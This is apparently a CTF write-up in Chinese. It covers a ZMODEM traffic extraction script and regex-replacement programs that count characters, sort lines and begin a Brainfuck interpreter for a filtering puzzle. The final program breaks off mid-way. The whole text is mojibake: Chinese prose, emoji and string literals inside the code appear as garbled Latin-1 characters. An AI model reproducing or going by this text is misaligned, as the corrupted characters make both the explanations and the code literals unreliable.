è¦åˆ†æ ZMODEM æµé‡ï¼Œæœä¸€ä¸‹å‘ç°äº† [æ‰‹æ’¸ZMODEMåè®® - çŸ¥ä¹](https://zhuanlan.zhihu.com/p/579720546)ï¼Œå…¶ä¸­æ¯”è¾ƒé‡è¦çš„æ˜¯é‡åˆ° `0x18` åé¢ä¸€ä¸ªå­—ç¬¦ä¼šè½¬ä¹‰ã€‚æŒ‰ç…§è¿™ä¸ªè§„åˆ™ï¼Œå‚è€ƒå…¶ç»™å‡ºçš„ [ä»£ç ](https://gitee.com/scu319hy/szrz_handler/tree/master)ï¼Œå¯ä»¥å†™ä¸€ä¸ªç®€åŒ–çš„æ•°æ®æå–ï¼š

```python
with open('level2.bin', 'rb') as f:
    data = f.read()

result = []
esc = False
skip = 0
i = -1
while i + 1 < len(data):
    i += 1
    c = data[i]
    if c == 0x18:
        esc = True
        continue
    if esc:
        if c & 0x60 == 0x40:
            if skip:
                skip -= 1
            else:
                result.append(c ^ 0x40)
        else:
            skip += 2
    elif skip:
        skip -= 1
    else:
        result.append(c)
    esc = False

with open('level2.out', 'wb') as f:
    f.write(bytes(result))
```

è¿™ä¸ªå®ç°æ˜¯ä¸å®Œå–„çš„ï¼Œ[å¾—åˆ°çš„ JPEG æ–‡ä»¶](/images/2023/10/thuctf2023/zserver-flag2-corrupted.jpg) æ˜¯ç ´æŸçš„ã€‚

ä½†æ˜¯æ²¡å…³ç³»ï¼Œå°†å®ƒè°ƒæ•´ä¸€ä¸‹ï¼š

![flag2-fixed](thuctf2023/zserver-flag2-fixed.png)

å¯ä»¥è¯»å‡º `flag{t***f1c_aNa*y51s*4*ZMOD*M}`ï¼Œæ ¹æ®è¯­ä¹‰å¯ä»¥çŒœå‡º flag ä¸º `flag{traFf1c_aNa1y51s_4_ZMODEM}`ã€‚

## PPC

### å…³é”®è¯è¿‡æ»¤å–µï¼Œè°¢è°¢å–µ

#### Level 1 å–µ

æ•°æ•°å–µï¼Œè¿›ä½å–µã€‚

```
    é‡å¤æŠŠã€[^a]ã€‘æ›¿æ¢æˆã€aã€‘å–µ
å¾ªç¯å–µï¼š
    æŠŠã€^$ã€‘æ›¿æ¢æˆã€0ã€‘å–µ
    æŠŠã€^aã€‘æ›¿æ¢æˆã€1ã€‘å–µ
    æŠŠã€0aã€‘æ›¿æ¢æˆã€1ã€‘å–µ
    æŠŠã€1aã€‘æ›¿æ¢æˆã€2ã€‘å–µ
    æŠŠã€2aã€‘æ›¿æ¢æˆã€3ã€‘å–µ
    æŠŠã€3aã€‘æ›¿æ¢æˆã€4ã€‘å–µ
    æŠŠã€4aã€‘æ›¿æ¢æˆã€5ã€‘å–µ
    æŠŠã€5aã€‘æ›¿æ¢æˆã€6ã€‘å–µ
    æŠŠã€6aã€‘æ›¿æ¢æˆã€7ã€‘å–µ
    æŠŠã€7aã€‘æ›¿æ¢æˆã€8ã€‘å–µ
    æŠŠã€8aã€‘æ›¿æ¢æˆã€9ã€‘å–µ
    æŠŠã€^9aã€‘æ›¿æ¢æˆã€10ã€‘å–µ
    æŠŠã€09aã€‘æ›¿æ¢æˆã€10ã€‘å–µ
    æŠŠã€19aã€‘æ›¿æ¢æˆã€20ã€‘å–µ
    æŠŠã€29aã€‘æ›¿æ¢æˆã€30ã€‘å–µ
    æŠŠã€39aã€‘æ›¿æ¢æˆã€40ã€‘å–µ
    æŠŠã€49aã€‘æ›¿æ¢æˆã€50ã€‘å–µ
    æŠŠã€59aã€‘æ›¿æ¢æˆã€60ã€‘å–µ
    æŠŠã€69aã€‘æ›¿æ¢æˆã€70ã€‘å–µ
    æŠŠã€79aã€‘æ›¿æ¢æˆã€80ã€‘å–µ
    æŠŠã€89aã€‘æ›¿æ¢æˆã€90ã€‘å–µ
    æŠŠã€^99aã€‘æ›¿æ¢æˆã€100ã€‘å–µ
    æŠŠã€099aã€‘æ›¿æ¢æˆã€100ã€‘å–µ
    æŠŠã€199aã€‘æ›¿æ¢æˆã€200ã€‘å–µ
    æŠŠã€299aã€‘æ›¿æ¢æˆã€300ã€‘å–µ
    æŠŠã€399aã€‘æ›¿æ¢æˆã€400ã€‘å–µ
    æŠŠã€499aã€‘æ›¿æ¢æˆã€500ã€‘å–µ
    æŠŠã€599aã€‘æ›¿æ¢æˆã€600ã€‘å–µ
    æŠŠã€699aã€‘æ›¿æ¢æˆã€700ã€‘å–µ
    æŠŠã€799aã€‘æ›¿æ¢æˆã€800ã€‘å–µ
    æŠŠã€899aã€‘æ›¿æ¢æˆã€900ã€‘å–µ
    æŠŠã€^999aã€‘æ›¿æ¢æˆã€1000ã€‘å–µ
    æŠŠã€0999aã€‘æ›¿æ¢æˆã€1000ã€‘å–µ
    æŠŠã€1999aã€‘æ›¿æ¢æˆã€2000ã€‘å–µ
    æŠŠã€2999aã€‘æ›¿æ¢æˆã€3000ã€‘å–µ
    æŠŠã€3999aã€‘æ›¿æ¢æˆã€4000ã€‘å–µ
    æŠŠã€4999aã€‘æ›¿æ¢æˆã€5000ã€‘å–µ
    æŠŠã€5999aã€‘æ›¿æ¢æˆã€6000ã€‘å–µ
    æŠŠã€6999aã€‘æ›¿æ¢æˆã€7000ã€‘å–µ
    æŠŠã€7999aã€‘æ›¿æ¢æˆã€8000ã€‘å–µ
    æŠŠã€8999aã€‘æ›¿æ¢æˆã€9000ã€‘å–µ
    æŠŠã€^9999aã€‘æ›¿æ¢æˆã€10000ã€‘å–µ
    æŠŠã€09999aã€‘æ›¿æ¢æˆã€10000ã€‘å–µ
    æŠŠã€19999aã€‘æ›¿æ¢æˆã€20000ã€‘å–µ
    æŠŠã€29999aã€‘æ›¿æ¢æˆã€30000ã€‘å–µ
    æŠŠã€39999aã€‘æ›¿æ¢æˆã€40000ã€‘å–µ
    æŠŠã€49999aã€‘æ›¿æ¢æˆã€50000ã€‘å–µ
    æŠŠã€59999aã€‘æ›¿æ¢æˆã€60000ã€‘å–µ
    æŠŠã€69999aã€‘æ›¿æ¢æˆã€70000ã€‘å–µ
    æŠŠã€79999aã€‘æ›¿æ¢æˆã€80000ã€‘å–µ
    æŠŠã€89999aã€‘æ›¿æ¢æˆã€90000ã€‘å–µ
    æŠŠã€^99999aã€‘æ›¿æ¢æˆã€100000ã€‘å–µ
    æŠŠã€099999aã€‘æ›¿æ¢æˆã€100000ã€‘å–µ
    æŠŠã€199999aã€‘æ›¿æ¢æˆã€200000ã€‘å–µ
    æŠŠã€299999aã€‘æ›¿æ¢æˆã€300000ã€‘å–µ
    æŠŠã€399999aã€‘æ›¿æ¢æˆã€400000ã€‘å–µ
    æŠŠã€499999aã€‘æ›¿æ¢æˆã€500000ã€‘å–µ
    æŠŠã€599999aã€‘æ›¿æ¢æˆã€600000ã€‘å–µ
    æŠŠã€699999aã€‘æ›¿æ¢æˆã€700000ã€‘å–µ
    æŠŠã€799999aã€‘æ›¿æ¢æˆã€800000ã€‘å–µ
    æŠŠã€899999aã€‘æ›¿æ¢æˆã€900000ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€aã€‘å°±è·³è½¬åˆ°ã€å¾ªç¯å–µã€‘å–µ
    è°¢è°¢å–µ
```

![flag1 å–µ](thuctf2023/filtered-flag1.png)

#### Level 2 å–µ

æ ¹æ®æç¤ºï¼Œå¯ä»¥ä½¿ç”¨ emoji ä½œä¸ºåˆ†éš”ç¬¦å–µï¼Œç„¶åå¯ä»¥æ¯è¡Œåˆ†åˆ«è¿›è¡Œå­—æ•°ç»Ÿè®¡å–µï¼Œæœ€åè¿›è¡ŒåŸºæ•°æ’åºå–µï¼ˆé€ä½é€šè¿‡äº¤æ¢ç›¸é‚»é€†åºå¯¹è¿›è¡Œç¨³å®šæ’åºå–µï¼‰ã€‚

```
    é‡å¤æŠŠã€^([^ğŸ¤”\n]+)$ã€‘æ›¿æ¢æˆã€\n\1ğŸ¤”\1\nã€‘å–µ
    é‡å¤æŠŠã€^([^ğŸ¤”\n]+)\nã€‘æ›¿æ¢æˆã€\n\1ğŸ¤”\1\nã€‘å–µ
    é‡å¤æŠŠã€\n([^ğŸ¤”\n]+)$ã€‘æ›¿æ¢æˆã€\n\1ğŸ¤”\1\nã€‘å–µ
    é‡å¤æŠŠã€\n([^ğŸ¤”\n]+)\nã€‘æ›¿æ¢æˆã€\n\1ğŸ¤”\1\nã€‘å–µ
    é‡å¤æŠŠã€\n\nã€‘æ›¿æ¢æˆã€\nã€‘å–µ
    é‡å¤æŠŠã€(ğŸ¤”|ğŸ™‚)[^\nğŸ™‚]ã€‘æ›¿æ¢æˆã€\1ğŸ™‚ã€‘å–µ
    é‡å¤æŠŠã€ğŸ¤”ğŸ™‚ã€‘æ›¿æ¢æˆã€ğŸ¤”0000ğŸ™‚ã€‘å–µ
å­—æ•°ç»Ÿè®¡å¾ªç¯å–µï¼š
    æŠŠã€0ğŸ™‚ã€‘æ›¿æ¢æˆã€1ã€‘å–µ
    æŠŠã€1ğŸ™‚ã€‘æ›¿æ¢æˆã€2ã€‘å–µ
    æŠŠã€2ğŸ™‚ã€‘æ›¿æ¢æˆã€3ã€‘å–µ
    æŠŠã€3ğŸ™‚ã€‘æ›¿æ¢æˆã€4ã€‘å–µ
    æŠŠã€4ğŸ™‚ã€‘æ›¿æ¢æˆã€5ã€‘å–µ
    æŠŠã€5ğŸ™‚ã€‘æ›¿æ¢æˆã€6ã€‘å–µ
    æŠŠã€6ğŸ™‚ã€‘æ›¿æ¢æˆã€7ã€‘å–µ
    æŠŠã€7ğŸ™‚ã€‘æ›¿æ¢æˆã€8ã€‘å–µ
    æŠŠã€8ğŸ™‚ã€‘æ›¿æ¢æˆã€9ã€‘å–µ
    æŠŠã€09ğŸ™‚ã€‘æ›¿æ¢æˆã€10ã€‘å–µ
    æŠŠã€19ğŸ™‚ã€‘æ›¿æ¢æˆã€20ã€‘å–µ
    æŠŠã€29ğŸ™‚ã€‘æ›¿æ¢æˆã€30ã€‘å–µ
    æŠŠã€39ğŸ™‚ã€‘æ›¿æ¢æˆã€40ã€‘å–µ
    æŠŠã€49ğŸ™‚ã€‘æ›¿æ¢æˆã€50ã€‘å–µ
    æŠŠã€59ğŸ™‚ã€‘æ›¿æ¢æˆã€60ã€‘å–µ
    æŠŠã€69ğŸ™‚ã€‘æ›¿æ¢æˆã€70ã€‘å–µ
    æŠŠã€79ğŸ™‚ã€‘æ›¿æ¢æˆã€80ã€‘å–µ
    æŠŠã€89ğŸ™‚ã€‘æ›¿æ¢æˆã€90ã€‘å–µ
    æŠŠã€099ğŸ™‚ã€‘æ›¿æ¢æˆã€100ã€‘å–µ
    æŠŠã€199ğŸ™‚ã€‘æ›¿æ¢æˆã€200ã€‘å–µ
    æŠŠã€299ğŸ™‚ã€‘æ›¿æ¢æˆã€300ã€‘å–µ
    æŠŠã€399ğŸ™‚ã€‘æ›¿æ¢æˆã€400ã€‘å–µ
    æŠŠã€499ğŸ™‚ã€‘æ›¿æ¢æˆã€500ã€‘å–µ
    æŠŠã€599ğŸ™‚ã€‘æ›¿æ¢æˆã€600ã€‘å–µ
    æŠŠã€699ğŸ™‚ã€‘æ›¿æ¢æˆã€700ã€‘å–µ
    æŠŠã€799ğŸ™‚ã€‘æ›¿æ¢æˆã€800ã€‘å–µ
    æŠŠã€899ğŸ™‚ã€‘æ›¿æ¢æˆã€900ã€‘å–µ
    æŠŠã€0999ğŸ™‚ã€‘æ›¿æ¢æˆã€1000ã€‘å–µ
    æŠŠã€1999ğŸ™‚ã€‘æ›¿æ¢æˆã€2000ã€‘å–µ
    æŠŠã€2999ğŸ™‚ã€‘æ›¿æ¢æˆã€3000ã€‘å–µ
    æŠŠã€3999ğŸ™‚ã€‘æ›¿æ¢æˆã€4000ã€‘å–µ
    æŠŠã€4999ğŸ™‚ã€‘æ›¿æ¢æˆã€5000ã€‘å–µ
    æŠŠã€5999ğŸ™‚ã€‘æ›¿æ¢æˆã€6000ã€‘å–µ
    æŠŠã€6999ğŸ™‚ã€‘æ›¿æ¢æˆã€7000ã€‘å–µ
    æŠŠã€7999ğŸ™‚ã€‘æ›¿æ¢æˆã€8000ã€‘å–µ
    æŠŠã€8999ğŸ™‚ã€‘æ›¿æ¢æˆã€9000ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€ğŸ™‚ã€‘å°±è·³è½¬åˆ°ã€å­—æ•°ç»Ÿè®¡å¾ªç¯å–µã€‘å–µ
æ’åºå¾ªç¯ä¸ªå–µï¼š
    æŠŠã€\n(.*ğŸ¤”...[1-9])\n(.*ğŸ¤”...[0-0])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[2-9])\n(.*ğŸ¤”...[0-1])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[3-9])\n(.*ğŸ¤”...[0-2])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[4-9])\n(.*ğŸ¤”...[0-3])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[5-9])\n(.*ğŸ¤”...[0-4])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[6-9])\n(.*ğŸ¤”...[0-5])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[7-9])\n(.*ğŸ¤”...[0-6])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[8-9])\n(.*ğŸ¤”...[0-7])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”...[9-9])\n(.*ğŸ¤”...[0-8])\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[1-9])\n(.*ğŸ¤”...[0-0])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[2-9])\n(.*ğŸ¤”...[0-1])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[3-9])\n(.*ğŸ¤”...[0-2])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[4-9])\n(.*ğŸ¤”...[0-3])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[5-9])\n(.*ğŸ¤”...[0-4])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[6-9])\n(.*ğŸ¤”...[0-5])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[7-9])\n(.*ğŸ¤”...[0-6])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[8-9])\n(.*ğŸ¤”...[0-7])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”...[9-9])\n(.*ğŸ¤”...[0-8])\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ä¸ªå–µã€‘å–µ
æ’åºå¾ªç¯åå–µï¼š
    æŠŠã€\n(.*ğŸ¤”..[1-9].)\n(.*ğŸ¤”..[0-0].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[2-9].)\n(.*ğŸ¤”..[0-1].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[3-9].)\n(.*ğŸ¤”..[0-2].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[4-9].)\n(.*ğŸ¤”..[0-3].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[5-9].)\n(.*ğŸ¤”..[0-4].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[6-9].)\n(.*ğŸ¤”..[0-5].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[7-9].)\n(.*ğŸ¤”..[0-6].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[8-9].)\n(.*ğŸ¤”..[0-7].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”..[9-9].)\n(.*ğŸ¤”..[0-8].)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[1-9].)\n(.*ğŸ¤”..[0-0].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[2-9].)\n(.*ğŸ¤”..[0-1].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[3-9].)\n(.*ğŸ¤”..[0-2].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[4-9].)\n(.*ğŸ¤”..[0-3].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[5-9].)\n(.*ğŸ¤”..[0-4].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[6-9].)\n(.*ğŸ¤”..[0-5].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[7-9].)\n(.*ğŸ¤”..[0-6].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[8-9].)\n(.*ğŸ¤”..[0-7].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”..[9-9].)\n(.*ğŸ¤”..[0-8].)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åå–µã€‘å–µ
æ’åºå¾ªç¯ç™¾å–µï¼š
    æŠŠã€\n(.*ğŸ¤”.[1-9]..)\n(.*ğŸ¤”.[0-0]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[2-9]..)\n(.*ğŸ¤”.[0-1]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[3-9]..)\n(.*ğŸ¤”.[0-2]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[4-9]..)\n(.*ğŸ¤”.[0-3]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[5-9]..)\n(.*ğŸ¤”.[0-4]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[6-9]..)\n(.*ğŸ¤”.[0-5]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[7-9]..)\n(.*ğŸ¤”.[0-6]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[8-9]..)\n(.*ğŸ¤”.[0-7]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”.[9-9]..)\n(.*ğŸ¤”.[0-8]..)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[1-9]..)\n(.*ğŸ¤”.[0-0]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[2-9]..)\n(.*ğŸ¤”.[0-1]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[3-9]..)\n(.*ğŸ¤”.[0-2]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[4-9]..)\n(.*ğŸ¤”.[0-3]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[5-9]..)\n(.*ğŸ¤”.[0-4]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[6-9]..)\n(.*ğŸ¤”.[0-5]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[7-9]..)\n(.*ğŸ¤”.[0-6]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[8-9]..)\n(.*ğŸ¤”.[0-7]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”.[9-9]..)\n(.*ğŸ¤”.[0-8]..)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯ç™¾å–µã€‘å–µ
æ’åºå¾ªç¯åƒå–µï¼š
    æŠŠã€\n(.*ğŸ¤”[1-9]...)\n(.*ğŸ¤”[0-0]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[2-9]...)\n(.*ğŸ¤”[0-1]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[3-9]...)\n(.*ğŸ¤”[0-2]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[4-9]...)\n(.*ğŸ¤”[0-3]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[5-9]...)\n(.*ğŸ¤”[0-4]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[6-9]...)\n(.*ğŸ¤”[0-5]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[7-9]...)\n(.*ğŸ¤”[0-6]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[8-9]...)\n(.*ğŸ¤”[0-7]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    æŠŠã€\n(.*ğŸ¤”[9-9]...)\n(.*ğŸ¤”[0-8]...)\nã€‘æ›¿æ¢æˆã€\n\2\n\1\nã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[1-9]...)\n(.*ğŸ¤”[0-0]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[2-9]...)\n(.*ğŸ¤”[0-1]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[3-9]...)\n(.*ğŸ¤”[0-2]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[4-9]...)\n(.*ğŸ¤”[0-3]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[5-9]...)\n(.*ğŸ¤”[0-4]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[6-9]...)\n(.*ğŸ¤”[0-5]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[7-9]...)\n(.*ğŸ¤”[0-6]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[8-9]...)\n(.*ğŸ¤”[0-7]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€\n(.*ğŸ¤”[9-9]...)\n(.*ğŸ¤”[0-8]...)\nã€‘å°±è·³è½¬åˆ°ã€æ’åºå¾ªç¯åƒå–µã€‘å–µ
    é‡å¤æŠŠã€ğŸ¤”[^\n]*ã€‘æ›¿æ¢æˆã€ã€‘å–µ
    é‡å¤æŠŠã€^\nã€‘æ›¿æ¢æˆã€ã€‘å–µ
    è°¢è°¢å–µ
```

![flag2 å–µ](thuctf2023/filtered-flag2.png)

#### Level 3 å–µ

å¼€å¤´åˆ°â€œğŸ‰â€æ˜¯è¾“å‡ºå–µï¼›åé¢ä¸€è¡Œæ˜¯æ•°æ®å–µï¼Œç”¨â€œğŸŒšâ€è¡¨ç¤º data pointer å–µï¼›æœ€åä¸€è¡Œæ˜¯æŒ‡ä»¤å–µï¼Œç”¨â€œğŸ¤”â€è¡¨ç¤º program counter å–µï¼Œé¢„å…ˆå°†åŒ¹é…çš„æ‹¬å·æŒ‰åµŒå¥—å±‚æ•°æ›¿æ¢ä¸º a-h è¡¨ç¤ºå·¦æ‹¬å·å–µï¼ŒA-H è¡¨ç¤ºå³æ‹¬å·å–µã€‚

```
    é‡å¤æŠŠã€[^><\+-\.\[\]]ã€‘æ›¿æ¢æˆã€ã€‘å–µ
    å¦‚æœçœ‹åˆ°ã€^$ã€‘å°±è·³è½¬åˆ°ã€ç»“æŸå–µã€‘å–µ
    æŠŠã€^ã€‘æ›¿æ¢æˆã€ğŸ¤”ã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]aA]*)\]ã€‘æ›¿æ¢æˆã€a\1Aã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]bB]*)\]ã€‘æ›¿æ¢æˆã€b\1Bã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]cC]*)\]ã€‘æ›¿æ¢æˆã€c\1Cã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]dD]*)\]ã€‘æ›¿æ¢æˆã€d\1Dã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]eE]*)\]ã€‘æ›¿æ¢æˆã€e\1Eã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]fF]*)\]ã€‘æ›¿æ¢æˆã€f\1Fã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]gG]*)\]ã€‘æ›¿æ¢æˆã€g\1Gã€‘å–µ
    é‡å¤æŠŠã€\[([^\[\]hH]*)\]ã€‘æ›¿æ¢æˆã€h\1Hã€‘å–µ
    æŠŠã€^ã€‘æ›¿æ¢æˆã€ğŸ‰\n,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0ğŸŒš,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\nã€‘å–µ
å¾ªç¯å–µï¼š
    å¦‚æœçœ‹åˆ°ã€ğŸ¤”>ã€‘å°±è·³è½¬åˆ°ã€å‘å³å–µã€‘å–µ
